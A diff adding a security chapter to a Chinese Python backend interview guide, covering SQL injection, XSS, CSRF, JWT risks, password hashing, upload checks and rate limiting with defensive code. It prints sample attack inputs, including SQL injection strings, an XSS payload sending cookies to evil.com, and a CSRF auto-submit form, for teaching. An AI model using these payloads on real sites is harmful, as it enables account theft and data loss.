@@ -1,6 +1,6 @@
 # Python 全栈后端面试题集
 
-> 覆盖：Python 核心 / Django / 数据库 / Redis / 分布式 / 微服务 / DevOps / AI
+> 覆盖：Python 核心 / Django / 数据库 / Redis / 分布式 / 微服务 / DevOps / AI / 安全
 > 每题含完整代码 + 深度面试话术
 
 ---
@@ -2605,4 +2605,517 @@ flowchart TB
 
 ---
 
-> 持续更新中 | 最后更新 2026-06-01
+---
+
+## 十一、后端安全防范措施
+
+### Q1: SQL 注入是什么？怎么防御？
+
+**攻击原理：** 用户输入被直接拼接到 SQL 语句中，攻击者在输入框里写 `'; DROP TABLE users; --`，拼接后变成 `SELECT * FROM users WHERE name = ''; DROP TABLE users; --'`，数据库执行了攻击者的 SQL。
+
+```python
+# ❌ 危险写法：字符串拼接
+user_input = request.GET.get("name")
+sql = f"SELECT * FROM users WHERE name = '{user_input}'"
+cursor.execute(sql)
+# 攻击输入: ' OR 1=1 --
+# 结果: SELECT * FROM users WHERE name = '' OR 1=1 --'
+#       返回所有用户！
+
+# ✅ 安全写法：参数化查询
+user_input = request.GET.get("name")
+cursor.execute("SELECT * FROM users WHERE name = %s", (user_input,))
+# %s 是占位符，PyMySQL 自动转义，用户输入永远被当作"数据"而非"SQL语句"
+```
+
+**面试话术：**
+
+> "SQL 注入的核心是**数据和代码的混淆**——用户输入被当成 SQL 代码执行。防御手段只有一个：参数化查询（Parameterized Query）。不管用什么 ORM（Django ORM、SQLAlchemy），它们底层都做了参数化，所以**只要你不手拼 SQL 字符串，就是安全的**。如果必须手写 SQL（复杂报表），**永远用 `%s` 占位符 + 参数元组**，绝不用 f-string 或 `+` 拼接。ORM 的 `.raw()` 方法也要传参数而非拼接。"
+
+---
+
+### Q2: XSS 跨站脚本攻击是什么？前后端分别如何防御？
+
+**攻击原理：** 攻击者在输入框提交 `<script>alert('盗取cookie')</script>`，如果后端存入数据库后前端直接渲染这段 HTML，浏览器会执行这段脚本，盗取用户数据。
+
+```python
+# 攻击流程
+# 1. 攻击者在用户名的输入框中输入:
+#    <script>fetch('http://evil.com?c='+document.cookie)</script>
+# 2. 后端存入数据库
+# 3. 其他用户访问用户列表页时，浏览器执行了这段脚本
+# 4. cookie 被发送到攻击者的服务器
+```
+
+**后端防御——输出编码：**
+
+```python
+import html
+
+# ❌ 危险：直接返回用户输入
+@app.get("/comments")
+def list_comments():
+    comments = db.query("SELECT content FROM comments")
+    return [{"content": c["content"]} for c in comments]
+    # 如果 content 是 <script>alert(1)</script>，前端直接渲染就中招
+
+# ✅ 安全：转义 HTML 特殊字符
+@app.get("/comments")
+def list_comments():
+    comments = db.query("SELECT content FROM comments")
+    return [{"content": html.escape(c["content"])} for c in comments]
+    # <script> 变成 &lt;script&gt; 被当成文本显示，不执行
+```
+
+**前端防御（Vue 自动做了）：**
+
+```javascript
+// Vue 默认转义: {{ userContent }} → 安全（自动转义 HTML）
+// ❌ v-html 不做转义: <div v-html="userContent"> → 危险！
+// ✅ 如果必须用 v-html: 先通过 DOMPurify 过滤
+import DOMPurify from 'dompurify';
+const sanitized = DOMPurify.sanitize(userContent);
+```
+
+**面试话术：**
+
+> "XSS 的核心是**把数据当成代码执行**。防御分两层——后端输出时 `html.escape()` 转义，前端避免 `v-html` / `innerHTML`，如果必须用，先过 DOMPurify。Vue/React 默认对 `{{ }}` 做了 HTML 转义，所以大部分 XSS 在前端框架里已经被防住了。真正危险的是富文本编辑器、用户签名等允许 HTML 的场景。"
+
+---
+
+### Q3: CSRF 跨站请求伪造是什么？如何防御？
+
+**攻击原理：** 用户已登录银行网站 A，攻击者诱导用户访问恶意网站 B。网站 B 的页面上有一个隐藏的表单，自动向网站 A 发起转账请求。因为用户已登录（cookie 还在），浏览器自动带上 cookie，银行以为是用户本人在操作。
+
+```
+1. 用户登录 bank.com，获得 session cookie
+2. 用户在另一个标签页访问 evil.com（钓鱼邮件链接）
+3. evil.com 页面有如下隐藏表单:
+   <form action="https://bank.com/transfer" method="POST">
+     <input type="hidden" name="to" value="attacker">
+     <input type="hidden" name="amount" value="10000">
+   </form>
+   <script>document.forms[0].submit()</script>
+4. 浏览器自动带上 bank.com 的 cookie，转账成功
+```
+
+**防御——CSRF Token：**
+
+```python
+# Django 内置 CSRF 中间件（默认开启）
+# settings.py
+MIDDLEWARE = [
+    "django.middleware.csrf.CsrfViewMiddleware",  # 检测 POST 请求的 csrfmiddlewaretoken
+]
+
+# 前端表单必须包含:
+# <form method="POST">
+#   {% csrf_token %}
+# </form>
+
+# API 场景（前后端分离）：用双重 Cookie 或自定义请求头
+# 1. 服务端在登录时设置一个随机 token 到 cookie
+# 2. 前端 JS 读取 cookie 值，放到请求头 X-CSRFToken
+# 3. 服务端比对 cookie 和请求头中的 token，一致才放行
+```
+
+**防御——SameSite Cookie：**
+
+```python
+# Django settings.py
+CSRF_COOKIE_SAMESITE = "Strict"  # 或 "Lax"
+SESSION_COOKIE_SAMESITE = "Strict"
+
+# Strict:  任何跨站请求都不发送 cookie（最安全）
+# Lax:     允许从外部链接跳转时发送（平衡安全与体验）
+# None:    始终发送（不安全，只用于跨域场景且必须配合 HTTPS）
+```
+
+**面试话术：**
+
+> "CSRF 利用了**浏览器自动携带 cookie 的特性**。攻击者不能读取 cookie（同源策略保护），但可以诱导浏览器发起请求，浏览器会自动带上 cookie。防御主要有三层：**CSRF Token**（隐藏字段，攻击者猜不到）、**SameSite Cookie**（Chrome 80+ 默认 Lax）、**验证码/二次确认**（敏感操作加手工确认）。前后端分离的 API 项目用 Token 认证（JWT）天然免疫 CSRF，因为 Token 不会像 cookie 一样自动发送。"
+
+---
+
+### Q4: JWT Token 有什么安全风险？如何防范？
+
+**攻击原理：** JWT 本身是无状态的——签发后无法在服务端撤销。这意味着：
+
+1. **Token 泄露后果严重**：攻击者拿到 token 后，在过期之前可以任意冒充用户
+2. **无法强制踢人下线**：如果用户修改密码，旧 token 仍然有效
+3. **Token 存储在 localStorage 有 XSS 风险**：localStorage 里的 token 可被 JS 读取
+
+```python
+# JWT 固有风险示意图
+# 用户修改密码后，旧的 token 不会自动失效
+token = jwt.encode({"user_id": 1, "exp": time() + 72*3600}, SECRET)
+# 这个 token 在 72 小时内始终有效，服务端无法"撤回"
+```
+
+**防范措施：**
+
+```python
+# 1. 短有效期 + Refresh Token
+ACCESS_TOKEN_EXPIRE = 15 * 60      # 15 分钟
+REFRESH_TOKEN_EXPIRE = 7 * 24 * 3600  # 7 天
+
+# 2. Token 黑名单（Redis）
+import redis
+r = redis.Redis()
+
+def revoke_token(token_jti: str, ttl: int):
+    """将 token 加入黑名单，ttl 内的请求被拒绝"""
+    r.setex(f"blacklist:{token_jti}", ttl, "1")
+
+def check_token(token_jti: str) -> bool:
+    """检查 token 是否在黑名单"""
+    return r.exists(f"blacklist:{token_jti}") == 0
+
+# 3. 不要在 payload 里放敏感信息
+# ❌ jwt.encode({"password": "xxx", "credit_card": "xxx"}, SECRET)
+# ✅ jwt.encode({"user_id": 1}, SECRET)
+
+# 4. 用 httpOnly cookie 存储 token（防 XSS 读取）
+# 前端无法通过 JS 读取 httpOnly cookie，XSS 攻击也读不到 token
+```
+
+**面试话术：**
+
+> "JWT 最大的问题是**无法主动撤销**。如果有人拿到 token，在过期前都能操作。应对策略：token 有效期设短一点（15 分钟），配合 Refresh Token 保证体验；需要强制踢人时用 Redis 黑名单；敏感信息不放 JWT payload（payload 只是 base64 编码，不是加密的）；推荐 httpOnly cookie 存 token，防止 JS 读取。"
+
+---
+
+### Q5: 密码应该如何存储？
+
+**攻击原理：** 如果数据库用明文存密码，一旦被拖库，所有用户的密码直接暴露。更重要的是，大部分用户在不同网站用同一个密码——一个网站泄露，全部账号遭殃。
+
+**正确做法——单向哈希 + 加盐：**
+
+```python
+import bcrypt
+
+# ✅ 注册时：bcrypt 哈希存储
+password = "user_password_123"
+hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())
+# 结果: $2b$12$KIXx3L... ← 包含了随机盐值，每次哈希结果不同
+
+# ✅ 登录时：验证哈希
+user_input = "user_password_123"
+if bcrypt.checkpw(user_input.encode(), hashed_from_db.encode()):
+    print("密码正确")
+
+# ❌ 错误做法展示：
+# 1. 明文存储: password = "123456"  → 泄露即完蛋
+# 2. 简单 MD5:  md5(password)       → 彩虹表秒破
+# 3. MD5 + 固定盐:  md5(password + "salt") → 密码相同哈希相同
+```
+
+| 哈希算法 | 安全性 | 推荐 |
+|------|------|------|
+| MD5 | 已被破解，彩虹表秒破 | ❌ |
+| SHA256 | 太快，可暴力枚举 | ❌ |
+| bcrypt | 慢哈希 + 自动加盐，抗暴力 | ✅ |
+| argon2 | 最先进，抗 GPU 破解 | ✅ |
+
+**面试话术：**
+
+> "密码存储核心原则：**永远不可逆**。用慢哈希（bcrypt/argon2）而不是快哈希（SHA256），因为慢哈希让攻击者的暴力枚举成本极高。`gensalt()` 会生成随机盐值，保证相同密码生成不同哈希，防彩虹表。说到登录安全，还有一个要点——**限制登录尝试次数**，比如同一个 IP 5 分钟内最多尝试 5 次，用 Redis 实现计数，阻止暴力破解。"
+
+---
+
+### Q6: 文件上传有什么安全风险？如何防范？
+
+**攻击原理：** 用户不只是上传图片——他可以上传包含恶意代码的 PHP 文件、可执行的 `.exe`、过大的文件撑爆磁盘、甚至文件名带 `../` 进行路径穿越。
+
+```python
+# 攻击示例
+# 1. 上传 webshell.php  → 如果存在可访问目录 → 远程执行命令
+# 2. 文件名: ../../../etc/passwd  → 覆盖系统文件
+# 3. 上传 10GB 文件 → 磁盘被撑爆
+# 4. 上传 .html 包含 XSS → 其他用户访问即中招
+```
+
+**防范措施：**
+
+```python
+import os
+import uuid
+from pathlib import Path
+from PIL import Image
+
+ALLOWED_EXTENSIONS = {".jpg", ".jpeg", ".png", ".gif", ".pdf"}
+MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB
+UPLOAD_DIR = Path("/var/uploads")
+
+
+def safe_upload(file) -> str:
+    # 1. 校验文件大小
+    file.file.seek(0, 2)  # 移到文件末尾
+    size = file.file.tell()
+    file.file.seek(0)
+    if size > MAX_FILE_SIZE:
+        raise ValueError("文件过大")
+
+    # 2. 校验扩展名白名单
+    suffix = Path(file.filename).suffix.lower()
+    if suffix not in ALLOWED_EXTENSIONS:
+        raise ValueError(f"不允许的文件类型: {suffix}")
+
+    # 3. 自己生成文件名（不用用户提供的）
+    safe_name = f"{uuid.uuid4()}{suffix}"
+    dest = UPLOAD_DIR / safe_name
+
+    # 4. 防路径穿越（确保最终路径在 UPLOAD_DIR 内）
+    if not str(dest.resolve()).startswith(str(UPLOAD_DIR.resolve())):
+        raise ValueError("路径穿越攻击")
+
+    # 5. 如果是图片，校验文件头（防伪造扩展名）
+    content = await file.read()
+    with open(dest, "wb") as f:
+        f.write(content)
+
+    if suffix in {".jpg", ".jpeg", ".png"}:
+        try:
+            img = Image.open(dest)
+            img.verify()  # 校验是否是合法图片
+            # 另存为消除可能嵌入的恶意代码
+            img = Image.open(dest)
+            img.save(dest)
+        except Exception:
+            os.remove(dest)
+            raise ValueError("文件不是合法图片")
+
+    # 6. 不要在可被直接访问的目录存放上传文件
+    # ✅ /var/uploads （不可被 Web 直接访问，通过 API 读取）
+    # ❌ /var/www/static/uploads （可被直接访问，上传的 PHP 会被执行）
+
+    return safe_name
+```
+
+**面试话术：**
+
+> "文件上传有五个风险点需要逐一防：**类型校验**检查扩展名白名单（不是黑名单，因为攻击者可以换不常见的后缀）；**大小限制**防 Dos；**文件名安全**自己生成 UUID 文件名，不用用户提供的名字；**内容校验**图片要验证文件头——把 `.php` 改名为 `.jpg` 是常见的绕过手法，PIL 的 `.verify()` 能检测出来；**存放位置**不与 Web 可执行目录放在一起，通过 API 读取而非直接 URL 访问。"
+
+---
+
+### Q7: 什么是 DDoS 攻击？后端如何防护？
+
+**攻击原理：** 攻击者控制大量傀儡机（肉鸡），同时向目标服务器发起海量请求，消耗带宽、CPU、内存、数据库连接等资源，导致正常用户无法访问。
+
+```
+正常:  用户A ──→ 服务器 ✓
+攻击:  10000 台肉鸡 ──→ 服务器 ✗（资源耗尽）
+```
+
+**防护措施——逐层限流：**
+
+```python
+# 层 1: Nginx 限流
+"""nginx.conf"""
+# 限制每个 IP 每秒最多 10 个请求
+limit_req_zone $binary_remote_addr zone=mylimit:10m rate=10r/s;
+
+server {
+    location /api/ {
+        limit_req zone=mylimit burst=20 nodelay;
+        proxy_pass http://backend;
+    }
+}
+
+# 层 2: 应用层限流（FastAPI + Redis）
+import time
+import redis
+from fastapi import HTTPException, Request
+
+r = redis.Redis()
+
+async def rate_limit(request: Request, max_requests: int = 60, window: int = 60):
+    """每个 IP 每分钟最多 60 个请求"""
+    client_ip = request.client.host
+    key = f"rate_limit:{client_ip}"
+    current = r.get(key)
+
+    if current is None:
+        r.setex(key, window, 1)
+    elif int(current) > max_requests:
+        raise HTTPException(status_code=429, detail="请求过于频繁，请稍后再试")
+    else:
+        r.incr(key)
+
+# 层 3: 敏感接口额外限制
+@app.post("/api/v1/login")
+async def login(request: Request, username: str, password: str):
+    # 登录接口限流：每个 IP 每分钟 5 次
+    client_ip = request.client.host
+    login_key = f"login_attempt:{client_ip}"
+    attempts = r.get(login_key)
+
+    if attempts and int(attempts) >= 5:
+        raise HTTPException(status_code=429, detail="登录尝试过多，请 5 分钟后重试")
+
+    r.incr(login_key)
+    r.expire(login_key, 300)
+    # ... 登录逻辑
+```
+
+**面试话术：**
+
+> "DDoS 防御是多层的，单靠应用层不够。第一层是 CDN（Cloudflare、阿里云 CDN）吸收流量；第二层是 Nginx `limit_req` 按 IP 限流；第三层是应用层对敏感接口单独限流（登录/注册/发验证码）。核心思想是**在离用户最近的地方拒绝恶意请求**，不要让它们到达业务代码。对于分布式 DDoS（每个 IP 只发少量请求），需要结合行为分析——比如同一用户 1 秒内从三个不同 IP 登录。"
+
+---
+
+### Q7 补充：IP 监控与自动封禁
+
+**攻击原理：** 仅靠限流还不够——攻击者可以控制在阈值边缘反复试探。需要**监控异常行为 → 自动封禁 → 定时解封**的完整闭环。
+
+常见的异常行为模式：
+
+| 行为 | 特征 | 判定 |
+|------|------|------|
+| 暴力破解 | 同一 IP 连续登录失败 | 5 次/5 分钟 → 封 30 分钟 |
+| 接口扫描 | 短时间内访问大量不存在的路径 | 404 次数异常 → 封 |
+| 爬虫 | 每秒请求超过阈值 | 超过阈值 → 加入黑名单 |
+| 代理池攻击 | 不同 IP 但相同 UA + 相同请求模式 | 行为指纹匹配 → 封 |
+
+**完整监控 + 封禁系统：**
+
+```python
+import redis
+import time
+from functools import wraps
+
+r = redis.Redis(decode_responses=True)
+
+
+class IPBlocker:
+    """IP 监控 + 自动封禁系统"""
+
+    # ── 检查是否已封禁 ──
+    @staticmethod
+    def is_blocked(ip: str) -> bool:
+        return r.exists(f"blocked:{ip}") == 1
+
+    # ── 封禁 IP ──
+    @staticmethod
+    def block(ip: str, reason: str, minutes: int = 30):
+        """封禁 IP 指定分钟"""
+        r.setex(f"blocked:{ip}", minutes * 60, reason)
+
+        # 记录到持久化日志（方便事后审计）
+        import logging
+        logging.warning(f"封禁IP: {ip} | 原因: {reason} | 时长: {minutes}分钟")
+
+    # ── 解封 ──
+    @staticmethod
+    def unblock(ip: str):
+        r.delete(f"blocked:{ip}")
+
+    # ── 记录失败行为（滑动窗口计数） ──
+    @staticmethod
+    def record_failure(ip: str, action: str, window: int = 300, threshold: int = 5):
+        """
+        记录一次失败行为。如果时间窗口内超过阈值，自动封禁。
+
+        action: "login_fail" | "404" | "api_abuse"
+        window: 时间窗口（秒）
+        threshold: 触发封禁的阈值
+        """
+        key = f"fail:{ip}:{action}"
+        count = r.incr(key)
+        r.expire(key, window)
+
+        if count >= threshold:
+            IPBlocker.block(ip, f"{action} 触发阈值 ({count}/{window}s)", minutes=30)
+            return True  # 已封禁
+        return False
+
+    # ── 获取封禁列表 ──
+    @staticmethod
+    def get_blocked_ips() -> list[dict]:
+        """获取当前所有被封禁的 IP 及原因"""
+        result = []
+        for key in r.scan_iter("blocked:*"):
+            ip = key.split(":", 1)[1]
+            reason = r.get(key)
+            ttl = r.ttl(key)
+            result.append({"ip": ip, "reason": reason, "remaining_seconds": ttl})
+        return result
+
+
+# ── FastAPI 中间件：自动拦截被封 IP ──
+from fastapi import Request, HTTPException
+
+@app.middleware("http")
+async def block_middleware(request: Request, call_next):
+    client_ip = request.client.host
+    if IPBlocker.is_blocked(client_ip):
+        reason = r.get(f"blocked:{client_ip}")
+        raise HTTPException(status_code=403, detail=f"IP 已被封禁: {reason}")
+    return await call_next(request)
+
+
+# ── 登录接口：集成失败监控 ──
+@app.post("/login")
+async def login(request: Request, username: str, password: str):
+    client_ip = request.client.host
+
+    # 1. 先检查是否已封禁
+    if IPBlocker.is_blocked(client_ip):
+        raise HTTPException(status_code=403, detail="IP 已被临时封禁，请稍后再试")
+
+    # 2. 验证密码
+    user = verify_user(username, password)
+    if not user:
+        # 记录失败 → 超过 5 次自动封禁
+        IPBlocker.record_failure(client_ip, "login_fail", window=300, threshold=5)
+        raise HTTPException(status_code=401, detail="用户名或密码错误")
+
+    # 3. 登录成功 → 清除该 IP 的失败记录
+    r.delete(f"fail:{client_ip}:login_fail")
+
+    return {"token": create_token(user["id"])}
+
+
+# ── 行为指纹识别（防代理池） ──
+def detect_anomaly(request: Request):
+    """
+    同一 User-Agent + 相同请求模式, 但不同 IP → 可能是代理池攻击
+    """
+    ua = request.headers.get("User-Agent", "")
+    path = request.url.path
+    fingerprint = f"anomaly:{ua}:{path}"
+
+    r.sadd(fingerprint, request.client.host)
+    r.expire(fingerprint, 60)  # 1 分钟窗口
+
+    ip_count = r.scard(fingerprint)
+    if ip_count > 10:  # 同一UA+同一接口, 1分钟内超过10个不同IP
+        for ip in r.smembers(fingerprint):
+            IPBlocker.block(ip, "代理池攻击检测", minutes=60)
+
+
+# ── Nginx 层封禁（最高效） ──
+"""
+当发现攻击时，把 IP 写入 Nginx 黑名单文件，让 Nginx 在 TCP 层直接拒绝，
+请求甚至不会到达 Python 进程。
+
+# 1. 应用层检测到攻击后写入文件
+echo "deny 192.168.1.100;" >> /etc/nginx/blocked_ips.conf
+
+# 2. Nginx 配置自动加载
+http {
+    include /etc/nginx/blocked_ips.conf;
+}
+
+# 3. 定期清理过期规则（cron）
+0 */2 * * * /usr/local/bin/clean_blocked_ips.py
+"""
+```
+
+**面试话术：**
+
+> "IP 监控封禁核心是**检测 → 封禁 → 解封**三步闭环。检测靠 Redis 滑动窗口计数——同一 IP 在 5 分钟窗口内触发失败多少次，超过阈值自动封禁 30 分钟，过期自动解封。封禁可以在三个层面：应用层（FastAPI 中间件直接拒绝）、Nginx 层（写入 deny 规则，最高效）、CDN 层（Cloudflare Firewall Rules，在流量入口就拦截）。还有一个容易被忽略的点——**行为指纹**。攻击者用代理池换 IP 时，每个 IP 只发少量请求，单 IP 限流拦不住。但他们的 User-Agent、请求路径、时间间隔模式是相同的，把这些做成指纹，跨 IP 关联分析就能识别出来。"
+
+---
+
+> 持续更新中 | 最后更新 2026-06-08
